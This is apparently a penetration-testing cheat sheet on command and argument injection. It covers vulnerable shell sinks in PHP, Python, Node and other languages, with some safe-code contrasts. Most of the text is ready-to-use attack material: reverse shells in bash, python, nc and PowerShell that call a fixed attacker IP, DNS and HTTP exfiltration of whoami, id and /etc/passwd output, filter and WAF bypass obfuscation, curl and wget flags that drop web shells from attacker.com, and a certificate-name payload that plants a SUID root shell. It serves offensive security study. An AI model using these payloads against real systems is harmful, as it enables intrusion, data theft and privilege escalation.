# Command Injection

#CommandInjection #ArgumentInjection #WebAttacks #RCE #Evasion #Fuzzing #commix #Bashfuscator #InvokeDOSfuscation #BurpSuite #ffuf

## What is this?

User-controlled input is passed unsanitized to a system shell call. The injected operator appends or chains commands to the intended one. Pairs with [[File Inclusion]], [[Server-Side Attacks]], [[Web Attacks]]. Vulnerable functions by language:

| Language | Dangerous Functions |
|---|---|
| PHP | `exec`, `system`, `shell_exec`, `passthru`, `popen`, `proc_open`, backticks |
| Node.js | `child_process.exec`/`execSync`; `spawn`/`execFile` **only with `{shell: true}`** |
| Python | `os.system`, `os.popen`, `subprocess.call/run/Popen` (**with `shell=True`**), `eval`/`exec` (code injection) |
| Ruby | backticks, `%x()`, `system`/`exec` with a **single string**, `Kernel#open("\|cmd")`, `IO.popen` |
| Perl | backticks, `system`/`exec` with one string, 2-arg `open` with a `\|` |
| Java | `Runtime.exec`/`ProcessBuilder` — **no shell**, splits on whitespace → argument injection only, unless the code runs `sh -c`/`cmd /c` |
| Go | `exec.Command` — no shell; dangerous only as `exec.Command("sh", "-c", userString)` |
| C# / .NET | `Process.Start`, `ProcessStartInfo` — exploitable when `FileName` is `cmd.exe`/`powershell` with concatenated `Arguments` |

### Recognising the sink in source code (the real signal)

When you can read the code (via LFI, a repo, a leaked `app.py`), the red flag is **not the function name alone** — it's a **shell** invocation whose command string is **built from request data**. In Python specifically:

```python
# 🚩 VULNERABLE — shell=True + an f-string/format/concat of user input
width = str(params.get('width'))          # attacker-controlled
command = f"convert {infile} -crop {width}x{height} {outfile}"
subprocess.run(command, capture_output=True, shell=True, check=True)   # shell parses ; | $() ` etc.
#   payload:  width = "100  ; bash -c 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1' #"

# ✅ SAFE — no shell, args passed as a LIST (shell=False is the default)
subprocess.run(["convert", infile, "-crop", crop_arg, outfile])
#   the same input is now just an argv element — no shell metacharacters are interpreted
```

The signal is **`shell=True` paired with `f"..."` / `.format()` / `%` / `+` on request data** — same class as SQL injection, shell syntax instead of SQL. `subprocess.run()` on its own (a list of args, `shell=False`) is safe even with identical user input; PHP `escapeshellarg`/`escapeshellcmd` and Node's `execFile`(vs `exec`) are the equivalents. Grep code review for: `shell=True`, `os.system(`, `os.popen(`, backtick/`$( )` in template strings, and any `exec(`/`eval(`.

> [!tip] Corollary for *reading* an app fast: when six modules import blueprints (`from api_edit import bp_edit`), don't read them top-to-bottom — **grep every source file for the sink signatures above** (and for `render_template_string`, `pickle.loads`, `yaml.load`) to jump straight to the exploitable handler. This is how you find `api_edit.py`'s `apply_visual_transform` without reading all six. See [[Non-PHP Web App Attacks]] and the Flask blueprint-map angle in [[Services/Web Services/Flask|Flask]].

### Re-parsed shell string — the double-parse sink (esp. in scripts / cron)

A second sink shape, common in **shell scripts and root cron jobs**: a variable *already holding attacker-controlled text* is spliced into a string, and that string is then handed to **`bash -c` / `sh -c` / `eval`**, which parses it **as code**. The data was never a metacharacter to the outer shell — it becomes one only at the *second* parse.

```bash
# 🚩 VULNERABLE — $commonName is parsed from an attacker-supplied cert; bash -c re-parses it
commonName=$(openssl x509 -in "$1" -noout -subject | grep -oP 'CN ?= ?\K[^,/]+')
/bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
#   CN = $(cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash)  ->  runs as whoever runs the script (root)

# ✅ SAFE — quote it and DON'T re-shell. mv is a binary; it needs no shell at all.
mv /tmp/temp.crt "/home/bill/Certs/$commonName.crt"
#   the payload becomes a silly filename and executes nothing
```

**The `bash -c` is the whole vulnerability, and it's usually gratuitous** — the wrapped command (`mv`, `cp`, `chown`) is a binary, not a shell builtin, so the shell buys nothing. The tell when reading a script: **a shell invocation wrapping a command that didn't need one, with a variable inside the quotes.**

> [!tip] **Order of operations — it fires even if the outer command fails.** Bash expands the entire line (command substitution included) in **phase 1**, then `execve`s the result in phase 2. So `$(...)` runs during expansion regardless of whether `mv` then succeeds — a `cp`/`chmod` payload yields empty stdout, the destination collapses to `.../.crt` (a dotfile `rm -r .../*` won't match), and a stray `.crt` is the fingerprint that the injection fired. Same root cause as the LFI decode-order gap ([[File Inclusion]] → *Decode-order / parser differential*): **data validated/built in one representation, then interpreted in another.**

Delivery is often through a **structured format** whose own escaping is a *separate* quoting layer — e.g. an OpenSSL cert Common Name, where `/ + = ,` are DN-structural and need `\`-escaping *before* the payload survives to the shell. That specific delivery (near-expiry cert to trigger a renewal cron, DN-escaping, the SUID-shell gotchas) lives in [[Tools/Web/openssl|openssl]] → *Abusing a cert-renewal script*; the privesc framing is in [[Linux Priv Esc]] → *Privileged process, attacker-controlled input*.

### PHP & Node.js sinks — and the escaping that doesn't save you

The table above lists the dangerous functions; the exploitable shape is the same as Python's — **a shell string built from request data** — but each language ships "sanitizers" that pentesters routinely find applied *wrongly*. Knowing what each one does (and doesn't) tells you whether a sink that *looks* defended is still live.

```php
// 🚩 VULNERABLE — every one of these hands the string to /bin/sh -c
system("ping -c 4 " . $_GET['host']);          // ; | && $() ` all fire
$out = shell_exec("nslookup " . $_GET['host']); // passthru / exec / popen / proc_open — same
$out = `nslookup {$_GET['host']}`;              // backticks == shell_exec

// ⚠ escapeshellcmd() — escapes ; | & $ ` etc. but NOT argument injection
system("curl " . escapeshellcmd($_GET['url']));
//   url = "http://10.10.14.5:8001/s.php -o /var/www/html/s.php"  → injects a flag; no separator needed.
//   escapeshellcmd neutralises COMMAND CHAINING, not attacker-controlled OPTIONS.
//   (It also leaves PAIRED quotes alone, and escapeshellarg()+escapeshellcmd() on the same
//    string re-opens a quote — the PHPMailer CVE-2016-10033/10045 sendmail -X chain.)

// ✅ escapeshellarg() — wraps the value in '...' as ONE argv element
system("ping -c 4 " . escapeshellarg($_GET['host']));
//   safe for a single argument — but only if it's actually used as one and not
//   concatenated with another escaped value or placed where an option is expected.
```

> [!warning] **`escapeshellcmd` ≠ `escapeshellarg`.** `escapeshellcmd` escapes shell *metacharacters* across a whole command, so it stops `;`/`|`/`$()` chaining — but it leaves `-`, spaces and `=` untouched, so **argument injection still works** (inject `-o`, `-f`, `--use-askpass`, a `file://` arg — see the Argument Injection section for what each binary gives you). `escapeshellarg` quotes a single argument and is the correct control; a codebase that reaches for `escapeshellcmd` is usually still exploitable via flags.

**Legacy PHP RCE without a shell function at all** — `preg_replace` with the `/e` modifier ran the replacement string as PHP code (removed in PHP 7.0, still seen on old CTF targets):

```php
preg_replace('/(.*)/e', 'strtoupper("\1")', $_GET['q']);   // 🚩 q = {${system($_GET[c])}} → RCE
```

```javascript
// 🚩 VULNERABLE — child_process.exec() runs its whole string in /bin/sh -c
const { exec } = require('child_process');
exec(`nslookup ${req.query.host}`, (e, out) => res.send(out));   // ; | && $() fire

// ✅ execFile / spawn take (file, argsArray) and DON'T spawn a shell — metachars are inert
const { execFile } = require('child_process');
execFile('nslookup', [req.query.host], (e, out) => res.send(out));
```

> [!warning] **Node's shell can sneak back in.** `spawn`/`execFile` are safe *until* someone passes `{ shell: true }` in the options — that re-enables `/bin/sh -c` and the args are re-parsed as shell, making the "safe" call injectable again. Grep for `child_process` **and** `shell: true`. (The command-*name* argument is never escaped either — `execFile(req.query.bin, ...)` is a separate RCE even without `shell:true`.)

---

## Tools

| Tool | Purpose |
|---|---|
| [[Tools/Web/Commix\|commix]] | Automated command injection detection and exploitation |
| [[Tools/Payloads & Shells/Bashfuscator\|Bashfuscator]] | Linux bash obfuscation framework |
| [[Tools/Payloads & Shells/Invoke-DOSfuscation\|Invoke-DOSfuscation]] | Windows CMD obfuscation generator |
| [[Tools/Web/Burpsuite\|Burp Suite]] | Intercept and fuzz injection points |
| [[Tools/Scanning/ffuf\|ffuf]] | Fuzz operators and payloads |
| [GTFOArgs](https://gtfoargs.github.io/) | Reference list of binaries exploitable via argument injection |

---

## Injection Operators

| Operator | Character | URL-Encoded | Behavior |
|---|---|---|---|
| Semicolon | `;` | `%3b` | Both commands execute |
| New Line | `\n` | `%0a` | Both commands execute |
| Background | `&` | `%26` | Both execute (second output shown first) |
| Pipe | `\|` | `%7c` | Both execute (only second output shown) |
| AND | `&&` | `%26%26` | Both only if first succeeds |
| OR | `\|\|` | `%7c%7c` | Second only if first fails |
| Sub-Shell | ` `` ` | `%60%60` | Both — Linux only |
| Sub-Shell | `$()` | `%24%28%29` | Both — Linux only |

> [!warning] **Windows `cmd.exe` doesn't chain on `;` or a newline.** It treats `;` as an argument delimiter, like a space, so use `&`, `&&`, `||` or `|`. PowerShell does accept `;`. On Linux, `%0a` is often the one operator a blacklist forgets, so try it early.

---

## Detection

### Verbose (output returned)

Inject a command after the target parameter — if output appears in the response, injection is confirmed:

```bash
# Test payloads (try different operators — one may be filtered)
127.0.0.1; whoami
127.0.0.1 && whoami
127.0.0.1 | whoami
x || whoami          # || only fires if the FIRST command fails — a valid IP makes it silent
127.0.0.1`whoami`
127.0.0.1$(whoami)
```

### Blind — time-based

No output returned. Inject a delay and measure response time:

```bash
# Linux
127.0.0.1; sleep 5
127.0.0.1 && sleep 5
127.0.0.1 | sleep 5

# Windows — ping -n N waits ~N-1 seconds (one per gap between echoes)
127.0.0.1& ping -n 6 127.0.0.1
127.0.0.1& powershell -c "Start-Sleep 5"
```

> [!note] If the response takes ~5 seconds longer → blind CI confirmed. Avoid `timeout /t 5` on Windows: when stdin is redirected (as it is under a web app) it exits immediately with *"Input redirection is not supported"*, which looks like a negative result.

### Blind — OOB (out-of-band)

Trigger a DNS or HTTP callback to a controlled server. Use Burp Collaborator or interactsh:

```bash
# Linux — DNS callback (confirm blind CI)
127.0.0.1; nslookup <collaborator-url>
127.0.0.1; curl http://<collaborator-url>/

# Linux — DNS with data exfil (data as subdomain — evades HTTP egress filters)
127.0.0.1; nslookup $(whoami).<collaborator-url>
127.0.0.1; host $(whoami).<collaborator-url>
# Data appears as the leftmost DNS label in your collaborator log
# e.g. nslookup www-data.abc123.oast.fun → you see "www-data" in DNS query

# Exfil arbitrary output — DNS labels allow only [a-z0-9-] and max 63 chars,
# so hex-encode and truncate (id's "(", ")", "=", "," would break a raw label)
127.0.0.1; nslookup $(id | xxd -p | head -c 60).<collaborator-url>
# longer output: send it in 60-char chunks, one lookup per chunk
127.0.0.1; id | xxd -p | tr -d '\n' | fold -w 60 | while read c; do nslookup $c.<collaborator-url>; done

# Linux — HTTP with data exfil (URL-safe base64, no line wraps)
127.0.0.1; curl http://<collaborator-url>/$(whoami)
127.0.0.1; wget -q -O- http://<collaborator-url>/$(id | base64 -w0 | tr '+/' '-_')
127.0.0.1; curl -s --data-binary @/etc/passwd http://<collaborator-url>/     # whole file in a POST body

# Windows — DNS
127.0.0.1& nslookup <collaborator-url>
127.0.0.1& nslookup %USERNAME%.<collaborator-url>
127.0.0.1& powershell -c "Invoke-WebRequest http://<collaborator-url>/"
```

---

## Filter / WAF Bypass

Filters may block specific operators, keywords (`cat`, `whoami`, `ls`), or characters (spaces, slashes). Test one character at a time to identify what's blocked.

### Whitespace Substitution (Linux)

| Trick | Result |
|---|---|
| `%09` | Tab — accepted where space is blocked |
| `${IFS}` | Internal Field Separator — expands to whitespace (works inside `$()` too) |
| `{ls,-la}` | Brace expansion — comma becomes space |

```bash
# Examples
cat${IFS}/etc/passwd
{cat,/etc/passwd}
cat%09/etc/passwd
ls${IFS}-la${IFS}/
```

### Whitespace Substitution (Windows)

| Trick | Result |
|---|---|
| `%09` | Tab |
| `%PROGRAMFILES:~10,-5%` | Space (CMD) |
| `$env:PROGRAMFILES[10]` | Space (PowerShell) |

### Character Tricks (Linux)

| Payload | Returns |
|---|---|
| `${PATH:0:1}` | `/` |
| `${LS_COLORS:10:1}` | `;` — **only if LS_COLORS is set**; it usually isn't in a web server's environment, so check `printenv` first |
| `$(tr '!-}' '"-~'<<<[)` | `\` (char shift) |
| `$(tr '!-}' '"-~'<<<:)` | `;` (char shift) |
| `printenv` | List all env vars — find useful chars |

```bash
# Example using env var chars to avoid slash and semicolon
127.0.0.1${LS_COLORS:10:1}${IFS}whoami
```

### Globbing (Linux) — Path/Command Obfuscation

The shell expands a glob into **every** matching path, sorted alphabetically, before it runs anything. **The first match becomes the command, and every other match becomes an argument.** A glob only works as a command-name bypass if it matches **exactly one** file on the target. Expansions below were checked on Kali; other distros have different binaries:

```bash
# ✅ unique matches — these work
/usr/bin/who??i            # → /usr/bin/whoami only
/???/bin/bas? -c 'id'      # → /usr/bin/bash only

# ❌ ambiguous — the FIRST alphabetical match runs, the rest become its arguments
/???/??t /etc/passwd       # → /bin/ant /bin/apt /bin/cat ... → runs ANT
/bin/c?t /etc/passwd       # → cat cct cut cvt → runs cat but also dumps 3 binaries
/bin/ca*  /usr/bin/who*    # → cachepic... / who whoami whois → wrong binary
/usr/bin/i?  /bin/l?       # → id ip / ld ln lp ls → may run ld, not ls

# Tighten the pattern until it's unique — mix literal chars with ? / [..]
/usr/bin/[c]at /etc/passwd   # bracket class — "cat" never appears literally
/usr/bin/l[s] -la

# Preview the expansion before you send it (on your box, or via a verbose sink):
echo /usr/bin/who??i
```

> [!tip] Glob ambiguity is target-specific. A pattern that's unique on a slim Docker image can match five binaries on a full Kali. If you can see output, `echo <pattern>` first.

### Character Tricks (Windows)

| Payload | Returns |
|---|---|
| `%HOMEPATH:~0,1%` | `\` (CMD) — always works: HOMEPATH starts with `\` |
| `%HOMEPATH:~0,-17%` / `%HOMEPATH:~6,-11%` | `\` — **HTB's forms; the offsets only fit the user `htb-student`** (`\Users\htb-student`). Recount for any other username |
| `$env:HOMEPATH[0]` | `\` (PowerShell) |
| `Get-ChildItem Env:` | All env vars |
| `%COMSPEC%` | Full path to `cmd.exe` — bypass if `cmd` keyword is filtered |

```cmd
:: %COMSPEC% as cmd.exe alias
%COMSPEC% /c whoami
%COMSPEC% /c "net user"

:: Useful if filter blocks the word "cmd" but not environment variable expansion
```

### Best-Fit / "WorstFit" (Windows Unicode → ANSI)

When a Windows app takes a Unicode string but calls the ANSI (`*A`) Win32 API, unmappable characters get silently substituted with a "visually similar" ASCII one via Best-Fit mapping. A filter that validates the *Unicode* input never sees the dangerous character — it appears only after conversion, downstream. Named **WorstFit** (Orange Tsai / Splitline Huang, Black Hat EU 2024); affected PHP-CGI, ElFinder, Cuckoo Sandbox, and others.

| Send (Unicode) | Codepoint | Becomes (ANSI) |
|---|---|---|
| `＂` fullwidth quotation mark | `U+FF02` | `"` |
| `－` fullwidth hyphen-minus | `U+FF0D` | `-` |
| `／` fullwidth solidus | `U+FF0F` | `/` |
| `＼` fullwidth reverse solidus | `U+FF3C` | `\` |
| `＞` fullwidth greater-than | `U+FF1E` | `>` |
| `｜` fullwidth vertical line | `U+FF5C` | `\|` |
| `＆` fullwidth ampersand | `U+FF06` | `&` |
| `Ｙ` fullwidth Y | `U+FF39` | `Y` |

```
# Argument injection where " and - are filtered — send the fullwidth forms instead
harmless.txt＂ －－use-askpass=calc ＂

# Quote-break out of an escaped argument that passed validation as Unicode
＂ ＆ whoami ＆ ＂
```

> [!warning] Only fires on the ANSI code page in use (varies by system locale) — a payload that works on a CP1252 host may not on CP932/CP936. Confirm which code page the target runs before ruling it out.

> [!tip] Also defeats path-traversal filters (`／..／..／` → `/../../`) and "properly implemented" argument escaping, since the escaping runs before the conversion.

---

## Command Obfuscation

### Linux

**Quote/backslash insertion** — breaks keyword without changing execution:

```bash
w'h'o'am'i       # → whoami
w"h"o"am"i       # → whoami
who$@ami          # → whoami
w\ho\am\i         # → whoami
```

**Case manipulation** (Linux is case-sensitive — use tr or printf):

```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")          # → whoami
$(a="WhOaMi";printf %s "${a,,}")           # → whoami   (bash 4+ only)
```

> [!note] **These tricks need bash, not `/bin/sh`.** `<<<` here-strings, `${a,,}`, `${VAR:x:y}` substrings and brace expansion are all bashisms. Dash (`/bin/sh` on Debian/Ubuntu) rejects them, so wrap the payload in `bash -c '...'` when the sink uses `sh -c` (PHP `system`, Python `shell=True`, Node `exec`). `${IFS}` and `$()` work in dash too. **On macOS**, `/bin/sh` runs bash **3.2**: here-strings and substrings work, but `${a,,}` doesn't (bash 4+), so use `tr`. The default *login* shell there is zsh, which isn't what web sinks run.

**Reversed commands**:

```bash
echo 'whoami' | rev                        # → imaohw
$(rev<<<'imaohw')                          # executes whoami
```

**Base64 encoding** — avoids keyword filters entirely:

```bash
# Encode
echo -n 'cat /etc/passwd' | base64         # → Y2F0IC9ldGMvcGFzc3dk

# Decode and execute
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)

# With quote obfuscation on the decoder
b'a's'h'<<<$('b'a's'e'6'4 -d<<<Y2F0IC9ldGMvcGFzc3dk)   # quote count must be even — a stray trailing ' = "unexpected EOF"
```

**Hex decoding**:

```bash
echo -n 'whoami' | xxd -p                  # → 77686f616d69
$(printf '\x77\x68\x6f\x61\x6d\x69')      # executes whoami
```

**Subshell substitution** — the inner `$()` runs and its *output* becomes part of the command line (not a chaining trick — the outer shell tries to run the result):

```bash
# $(command) is replaced by its output before execution — build commands dynamically,
# e.g. run a command whose name is produced by another command:
$(rev<<<'imaohw')        # → runs whoami
$(base64 -d<<<bHM=)      # → runs ls
```

### Windows

**Caret insertion** (CMD only — `^` is CMD's escape char; escaping an ordinary letter just yields the letter):

```cmd
who^ami    → whoami
```

**Case** (Windows CMD is case-insensitive — no trick needed):

```cmd
WhOaMi     → whoami
```

**Reversed commands** (PowerShell):

```powershell
"whoami"[-1..-20] -join ''                            # → imaohw
iex "$('imaohw'[-1..-20] -join '')"                  # executes whoami
```

**Base64 encoding** (PowerShell — must be UTF-16LE):

```powershell
# Encode
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
# → dwBoAG8AYQBtAGkA

# Decode and execute
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"

# Or via powershell -EncodedCommand
powershell -EncodedCommand dwBoAG8AYQBtAGkA
```

---

## Escalation — Get a Shell

Once injection is confirmed, upgrade to a full reverse shell. Set up listener first:

```bash
nc -lvnp 9001
```

### Linux reverse shells

```bash
# bash — most sinks run your input under /bin/sh (dash on Debian/Ubuntu), which rejects the
# bash-only ">&" and /dev/tcp syntax ("Bad fd number"), so wrap it in bash -c
bash -c 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1'

# URL-encoded version (for injection in URL params) — same bash -c wrapper
bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.5/9001%200%3E%261%27

# via /dev/tcp without bash -i — /dev/tcp is still a bash feature, so this needs bash too
bash -c '0<&196;exec 196<>/dev/tcp/10.10.14.5/9001; sh <&196 >&196 2>&196'

# python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# nc (if -e available)
nc -e /bin/sh 10.10.14.5 9001

# nc (without -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 9001 >/tmp/f
```

### Windows reverse shells

```powershell
# PowerShell one-liner
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',9001);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"

# cmd through nc
nc.exe -e cmd.exe 10.10.14.5 9001
```

> Upgrading the shell to a full TTY, plus more shell variants: [[Shells & Payloads]].

---

## Automated Testing — commix

```bash
# Basic scan — commix auto-tests each parameter (mark a specific point with * )
commix --url "http://target.com/ping.php?ip=127.0.0.1"
commix --url "http://target.com/ping.php?ip=127.0.0.1*"   # force injection at *

# POST request
commix --url "http://target.com/ping.php" --data "ip=127.0.0.1"

# With cookie
commix --url "http://target.com/ping.php?ip=127.0.0.1" --cookie "PHPSESSID=abc123"

# From Burp request file
commix -r request.txt

# Force technique — letters: c=classic e=eval t=time-based f=file-based
commix --url "http://target.com/ping.php?ip=127.0.0.1" --technique=t    # time-based
commix --url "http://target.com/ping.php?ip=127.0.0.1" --technique=f    # file-based (semi-blind: writes output to a web-readable file, then fetches it)

# Run a single command / drop to the interactive pseudo-shell (auto after detection)
commix --url "http://target.com/ping.php?ip=127.0.0.1" --os-cmd="id"
```

---

## Obfuscation Tools

```bash
# Bashfuscator (Linux)
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator && pip3 install -e .

bashfuscator -c 'cat /etc/passwd'                    # random mutators (output can be huge)
bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1   # smallest payload
bashfuscator -c 'id' -q --test                       # -q payload only; --test runs it locally to prove it works
# --choose-mutators picks specific ones by hand; -l lists them

# Invoke-DOSfuscation (Windows PowerShell)
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
SET COMMAND whoami
encoding
1      # select encoding type
```

---

## Filter Detection Methodology

Map the filter systematically before burning time on complex bypasses.

```bash
1. Test each operator solo — which ones trigger a block vs pass through?
   ; | & && || \n $() ``

2. Test a benign command with a passing operator — does output appear?
   ; id    ; uname    ; echo test

3. Test whitespace — is space blocked?
   ;${IFS}id    ;%09id    ;{ls,-la}     (braces need a comma — {id} alone is NOT expanded)

4. Test slashes — is / blocked?
   ;cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd

5. Test command keywords — which are blocked?
   id → not blocked?  whoami → blocked?  uname → blocked?

6. Narrow down: if keyword is blocked, try alternatives (see table below)
   or use obfuscation (quotes, base64, reversal)
```

> [!note] One character at a time. A WAF may silently drop the whole request or return a generic error — use time-based confirmation if output disappears.

---

## Blacklisted Command Alternatives

When a command keyword is filtered, substitute with an equivalent:

### File read

| Blocked | Alternatives |
|---|---|
| `cat` | `tac` `more` `less` `head` `tail` `nl` `od` `xxd` `strings` |
| `cat /etc/passwd` | `while read l; do echo $l; done < /etc/passwd` |
| `cat` | `grep '' /etc/passwd` (grep with empty pattern prints all) |

```bash
tac /etc/passwd
head -n 50 /etc/passwd
nl /etc/passwd
od -c /etc/passwd
xxd /etc/passwd
strings /etc/passwd
grep${IFS}''${IFS}/etc/passwd
```

### Directory listing

| Blocked | Alternatives |
|---|---|
| `ls` | `find . -maxdepth 1` `dir` (Windows) `echo *` `printf '%s\n' *` |

```bash
find . -maxdepth 1
echo *
printf '%s\n' /var/www/html/*
```

### User / system info

| Blocked | Alternatives |
|---|---|
| `whoami` | `id` `id -un` — `$USER` is often **unset** under a web server (systemd/Apache don't export it) |
| `hostname` | `uname -n` `cat /etc/hostname` `cat /proc/sys/kernel/hostname` |
| `uname` | `cat /proc/version` `cat /etc/os-release` |
| `ifconfig` | `ip a` `hostname -I` `cat /proc/net/fib_trie` (IPv4) `cat /proc/net/if_inet6` (IPv6) |
| `netstat` | `ss -tlnp` `cat /proc/net/tcp` (hex addr:port) |
| `ps` | `ls -l /proc/*/exe` `tr '\0' ' ' </proc/<pid>/cmdline` (cmdline is NUL-separated) |

### Network / data exfil

| Blocked | Alternatives |
|---|---|
| `curl` | `wget` `fetch` `lynx` `python3 -c "import urllib..."` |
| `wget` | `curl` `nc` `bash /dev/tcp/...` |
| `nc` | `bash -i >& /dev/tcp/...` `socat` `python3 socket` |

### Windows alternatives (CMD / PowerShell)

| Blocked | Alternatives |
|---|---|
| `type` | `more` `Get-Content` `gc` |
| `dir` | `ls` (PS) `Get-ChildItem` `gci` |
| `whoami` | `echo %USERNAME%` `$env:USERNAME` |
| `ipconfig` | `Get-NetIPAddress` |
| `net user` | `Get-LocalUser` |

---

## Argument Injection

A distinct case: the injection point is **inside the arguments** of a command, not after it. You can't append a new command, but you can inject flags that change what the existing command does.

Common when the app builds a command like:
```bash
curl <user-input>
wget <user-input>
ffmpeg -i <user-input>
convert <user-input> output.jpg
rsync <user-input> /backup/
```

### curl argument injection

```bash
# Inject --output to write a file (web shell)
http://attacker.com/shell.php --output /var/www/html/shell.php

# Read internal files via file://
file:///etc/passwd

# SSRF via redirected fetch
http://169.254.169.254/latest/meta-data/ -o /tmp/meta

# Inject -x to use a proxy (exfil data)
http://target.com/ -x http://attacker.com:8080/

# -K/--config loads a curl config file — every option in it is honoured,
# including -o/--output, so one injected flag turns into arbitrary file write
http://attacker.com/ -K /tmp/uploaded.txt
# where /tmp/uploaded.txt contains:  output = "/var/www/html/shell.php"
#                                    url = "http://attacker.com/shell.php"
```

### wget argument injection

```bash
# Write file to web root
http://attacker.com/shell.php -O /var/www/html/shell.php

# --post-file to exfil a local file
http://attacker.com/ --post-file=/etc/passwd

# --use-askpass= runs the given binary at startup (wget ≥1.20) — straight to RCE, no operators needed
http://attacker.com/ --use-askpass=/tmp/payload.sh
# it's spawned directly (no sh, no extra args — only the prompt text as argv[1]), so the
# file must already be executable with a #! line. A file staged with -O lands WITHOUT +x,
# so you need a second primitive (chmod, an upload that keeps modes) to make it runnable.

# -O to an authorized_keys / cron path when running privileged
http://attacker.com/key.pub -O /root/.ssh/authorized_keys
```

> [!tip] [GTFOArgs](https://gtfoargs.github.io/) is the argument-injection equivalent of GTFOBins — look the binary up there before hand-rolling a gadget.

### ImageMagick / convert argument injection

```bash
# Fetch a remote image and -write a copy into the web root (file write — the image must
# carry PHP, e.g. in an EXIF comment, for the copy to execute)
http://attacker.com/img.jpg -write /var/www/html/shell.php

# Or via label: scheme (reads file content as text into the image)
label:@/etc/passwd output.png
# NB: many distro policy.xml files block "@" file reads (path "@*" rights="none") — check before relying on it
```

### ffmpeg argument injection

```bash
# SSRF — ffmpeg fetches any http(s) input. It's blind (text isn't decodable media),
# so confirm with an OOB callback / timing rather than expecting the body back
http://169.254.169.254/latest/meta-data/

# File overwrite — inject -y + an extra output path (writes where the app user can write)
input.mp4 -y /var/www/html/x.mp4
```

> [!note] `concat:/etc/passwd` doesn't leak the file. ffmpeg tries to decode it as media and fails with *"Invalid data found when processing input"*. The real ffmpeg local-file-read is the **HLS playlist trick**: an uploaded `.m3u8`/`.avi` whose playlist references `file:///etc/passwd`, so the file content gets rendered into the transcoded video. That's an upload bug, not argument injection — see [[File Upload Attacks]].

### rsync argument injection

```bash
# -e sets the "remote shell" — rsync only runs it when a host:path operand is present,
# so inject a fake remote spec too (verified on rsync 3.5.0: no host: → nothing runs)
-e 'sh -c "id>/tmp/pwned"' x:/dev/null
```

> [!note] Argument injection often bypasses command injection filters because no operator characters are needed — the injected content looks like a URL or flag.

> [!warning] **Injecting *extra* arguments needs word splitting.** A space in your input only creates a new argv element if the value lands **unquoted** in a shell string, if `escapeshellcmd` was used, or if a no-shell API splits on whitespace (Java `Runtime.exec(String)`). If the value arrives as **one** argv element (`escapeshellarg`, a Python/Node arg list), you only control that single argument. That still works when the value *starts with* `-` (`--use-askpass=...`, `-K/tmp/x`), so try a one-token flag. If the app prefixes `--` before your value, flags are dead too.

---

## Injection Operator Cheatsheet (Copy-Paste)

```bash
;
%3b
\n
%0a
&
%26
|
%7c
&&
%26%26
||
%7c%7c
``
%60%60
$()
%24%28%29
```

---

## Quick Reference

| Goal | Payload |
|---|---|
| Test verbose | `; whoami` `&& id` `\| id` |
| Test blind (time) | `; sleep 5` `& ping -n 6 127.0.0.1` |
| Test blind (OOB) | `; curl http://<collab>/$(whoami)` |
| Space bypass (Linux) | `${IFS}` `%09` `{cmd,-arg}` |
| Keyword bypass via glob | `/usr/bin/who??i` — must match **one** file (`echo` it first) |
| Slash bypass (Linux) | `${PATH:0:1}` |
| Quote bypass (Linux) | `w'ho'ami` `w\ho\am\i` |
| Case bypass (Linux) | `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` |
| Reverse cmd (Linux) | `$(rev<<<'imaohw')` |
| Base64 exec (Linux) | `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)` |
| `cat` alternatives | `tac` `more` `head` `nl` `grep '' /file` |
| `ls` alternatives | `find . -maxdepth 1` `echo *` |
| `whoami` alternatives | `id` `id -un` `echo $USER` |
| Caret bypass (Windows CMD) | `who^ami` |
| Base64 exec (Windows PS) | `powershell -EncodedCommand <b64>` |
| Best-Fit bypass (Windows) | `＂` (U+FF02) → `"`, `－` (U+FF0D) → `-` |
| Argument injection | `curl <input> --output /webroot/shell.php` |
| Argument injection → RCE | `wget <input> --use-askpass=/tmp/payload.sh` |
| Argument injection → file write | `curl <input> -K /tmp/attacker.conf` |
| Automate | `commix --url "..." --os-cmd="id"` |
| Linux obfuscate | `bashfuscator -c 'cmd'` |
| Windows obfuscate | `Invoke-DOSfuscation` |

---

*Created: 2026-03-02*
*Updated: 2026-10-08*
*Model: claude-opus-5-5*
